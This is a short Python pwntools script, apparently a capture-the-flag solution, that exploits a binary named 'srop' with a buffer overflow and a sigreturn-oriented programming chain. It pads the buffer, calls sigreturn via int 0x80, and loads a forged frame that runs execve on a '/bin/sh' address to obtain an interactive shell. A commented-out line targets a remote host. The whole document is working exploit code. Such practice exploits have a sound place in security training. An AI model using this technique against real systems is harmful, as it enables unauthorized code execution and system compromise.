from pwn import *
context.log_level = 'debug'

# p = remote("realsung.kr", 13336)
p = process('./srop')
e = ELF("./srop")
gdb.attach(p)

sa = lambda x, y : p.sendafter(x, y)
sla = lambda x, y : p.sendlineafter(x, y)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
rvl = lambda : p.recvline()
rvu = lambda x : p.recvuntil(x)

binsh = 0x08048570
pop_eax = 0x0804848e
int80 = 0x08048496

frame = SigreturnFrame(kernel='amd64')
frame.eax = 11
frame.ebx = binsh
frame.eip = int80

payload = b'A' * (0x8 + 0x4)
payload += p32(pop_eax)
payload += p32(119)
payload += p32(int80)

payload += bytes(frame)

s(payload)

p.interactive()